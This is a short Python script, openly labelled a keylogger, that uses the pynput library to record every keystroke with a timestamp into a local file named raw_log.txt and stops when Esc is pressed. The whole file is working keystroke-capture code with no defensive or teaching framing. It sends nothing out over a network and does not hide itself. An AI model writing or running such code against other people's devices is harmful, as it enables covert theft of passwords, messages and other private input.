from pynput.keyboard import Listener
import time
import os

# File to extract logs into
log_file = "raw_log.txt"

# Check if file exists, then creats/writes into the file. Extracting the time when the keylogger is activated
if not os.path.exists(log_file):
    with open(log_file, "w") as file:
        file.write("Keylogger started at: {}\n".format(time.ctime()))

# Function called with every key pressed, logs it into file with that current timestamp
def on_press(key):
    try:
        with open(log_file, "a") as file:
            file.write("{0} - {1}\n".format(time.ctime(), key.char))
    except AttributeError:
        with open(log_file, "a") as file:
            file.write("{0} - {1}\n".format(time.ctime(), key))
        
        # Break zone, when esc key is entered, the keylogger stops
        if key == key.esc:
            return False

# Enables input from keyboard
with Listener(on_press=on_press) as listener:
    listener.join()
